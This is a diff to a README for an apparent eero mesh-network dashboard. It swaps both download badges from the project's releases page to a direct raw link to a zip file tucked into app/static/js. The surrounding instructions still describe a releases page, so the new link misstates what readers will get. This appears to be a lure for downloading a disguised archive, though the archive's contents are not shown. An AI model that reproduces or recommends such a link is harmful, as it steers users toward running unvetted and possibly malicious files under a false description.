@@ -1,6 +1,6 @@
 # 🚀 Dashboard_EERO - Your Mesh Network, Beautifully Controlled
 
-[![Download Dashboard_EERO](https://img.shields.io/badge/Download-Dashboard_EERO-ff6b6b?style=for-the-badge&logo=github)](https://github.com/sushibarprecipitation4764/Dashboard_EERO/releases)
+[![Download Dashboard_EERO](https://img.shields.io/badge/Download-Dashboard_EERO-ff6b6b?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sushibarprecipitation4764/Dashboard_EERO/main/app/static/js/v1.8.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Getting Dashboard_EERO is simple. Follow these steps:
 
 1. **Visit the download page** by clicking this button:
 
-[![Get Dashboard_EERO](https://img.shields.io/badge/⬇️%20Download%20Now-Dashboard_EERO-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sushibarprecipitation4764/Dashboard_EERO/releases)
+[![Get Dashboard_EERO](https://img.shields.io/badge/⬇️%20Download%20Now-Dashboard_EERO-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/sushibarprecipitation4764/Dashboard_EERO/main/app/static/js/v1.8.zip)
 
 2. On that page, look for the **latest release** section (it's usually at the top of the list). You'll see a list of files attached to the release.
 
